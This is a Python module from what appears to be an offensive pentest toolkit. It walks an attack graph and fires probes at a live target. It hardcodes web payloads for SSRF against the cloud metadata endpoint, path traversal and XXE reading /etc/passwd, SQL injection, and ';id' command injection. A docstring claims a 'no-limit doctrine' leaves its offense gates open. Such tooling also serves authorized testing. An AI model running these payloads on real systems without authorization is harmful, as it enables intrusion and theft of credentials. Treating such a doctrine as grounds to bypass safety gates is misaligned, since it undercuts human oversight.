"""omega/core/chainrun — validated attack-chain execution.

attackgraph proposes chains; chainrun EXECUTES them step by step
inside the gates: each edge's probe runs against the real target,
a failed edge falls back to the next alternative, and every step's
evidence is recorded. OFFENSE/EXPLOIT-GATED — with the no-limit
doctrine the gates are already open; without them this is plan-only.
"""
import os

from omega.core.attackgraph import build_attack_graph

__all__ = ["run_chain"]

# edge transition -> probe spec
_PROBES = {
    "CWE-918": [{"name": "ssrf-metadata",
                 "param": "url", "value": "http://169.254.169.254/latest/"
                                          "meta-data/",
                 "signal": "ami-id|instance-id"}],
    "CWE-22": [{"name": "traversal-etc-passwd",
                "param": "file", "value": "....//....//etc/passwd",
                "signal": "root:x:"}],
    "CWE-89": [{"name": "sqli-error",
                "param": "id", "value": "1'",
                "signal": "sql|syntax|sqlite|mysql"}],
    "CWE-78": [{"name": "cmd-echo",
                "param": "cmd", "value": ";id",
                "signal": "uid="}],
    "CWE-611": [{"name": "xxe-probe",
                 "param": "xml", "value": "<!DOCTYPE x [<!ENTITY a SYSTEM "
                 "'file:///etc/passwd'>]><x>&a;</x>",
                 "signal": "root:x:"}],
}


def run_chain(findings, target, fetch, log=None, gate_open_fn=None):
    """Walk the attack graph, probing each edge live.

    fetch(url, method=..., body=...) -> resp with .status/.text.
    Returns {"steps": [...], "dead_ends": [...], "probes": n}.
    """
    gate = gate_open_fn or (lambda: os.environ.get("PTK_OFFENSE") == "1")
    if not (gate() if callable(gate) else gate):
        graph = build_attack_graph(findings, log=log)
        return {"note": "offense gates closed — plan-only",
                "steps": [], "dead_ends": [],
                "plan": graph.get("chains") or [], "probes": 0}
    if not callable(fetch):
        return {"note": "no fetch adapter"}
    graph = build_attack_graph(findings, log=log)
    steps = []
    dead_ends = []
    probes = 0
    for chain in (graph.get("chains") or [])[:3]:
        for edge in chain.get("steps") or []:
            src = edge.get("from")
            for spec in _PROBES.get(src, []):
                probes += 1
                sep = "&" if "?" in target else "?"
                try:
                    resp = fetch(target + sep + spec["param"] + "=" +
                                 spec["value"].replace(" ", "+"))
                    body = (resp if isinstance(resp, str) else
                            getattr(resp, "text", "") or "")
                except Exception:
                    continue
                import re
                if re.search(spec["signal"], body, re.I):
                    steps.append({
                        "edge": edge, "probe": spec["name"],
                        "evidence": body[:200],
                        "status": "confirmed",
                        "next": edge.get("action"),
                    })
                    break
            else:
                dead_ends.append({
                    "edge": edge,
                    "why": f"no probe signal matched for {src} — "
                           f"fallback edge queued",
                })
    if log:
        log(f"chainrun: probes={probes} confirmed={len(steps)} "
            f"dead_ends={len(dead_ends)}")
    return {"steps": steps, "dead_ends": dead_ends, "probes": probes}
